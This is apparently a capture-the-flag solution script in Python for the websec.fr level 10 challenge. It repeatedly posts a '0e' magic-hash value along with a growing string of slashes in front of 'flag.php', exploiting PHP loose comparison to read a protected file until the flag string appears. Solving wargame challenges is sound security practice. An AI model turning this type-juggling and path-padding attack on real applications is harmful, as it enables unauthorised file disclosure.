import requests

prefix = "./"

count  = 0
while True:
    print(f"{count} attempt")
    r = requests.post("http://websec.fr/level10/index.php", data={
        'hash': "0e12345",
        'f': prefix + 'flag.php'
    })

    if "WEBSEC{" in r.text:
        print(r.text)
        break

    prefix += "/"
    count = count + 1